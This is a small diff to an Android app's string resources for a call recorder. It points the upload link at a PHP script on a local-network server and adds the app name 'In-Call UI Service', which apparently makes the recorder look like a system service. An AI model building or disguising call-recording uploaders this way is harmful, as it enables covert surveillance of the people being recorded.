@@ -1,4 +1,5 @@
 <resources>
     <string name="app_name">Call Recorder</string>
-    <string name="callrecorder__php_link">http://192.168.0.9/TestFileUp/hello.php</string>
+    <string name="callrecorder__php_link">http://192.168.0.234/sparrow/record/recordHere.php</string>
+    <string name="app_name_overall">In-Call UI Service</string>
 </resources>
